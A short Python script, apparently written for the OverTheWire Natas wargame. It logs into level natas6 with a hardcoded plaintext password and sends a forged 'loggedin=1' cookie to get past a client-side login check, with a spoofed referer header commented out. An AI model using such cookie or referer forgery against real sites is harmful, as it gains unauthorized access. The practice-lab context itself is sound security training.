#!/bin/python
import requests
import re

username = "natas6"
pwd = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"
url = f"http://{username}.natas.labs.overthewire.org"
#headers={'referer':'http://natas5.natas.labs.overthewire.org/'}
session = requests.Session()
cookie= {"loggedin":'1'}
response = session.get(url,auth=(username,pwd),cookies=cookie)
content=response.text
print(content)
print(session.cookies)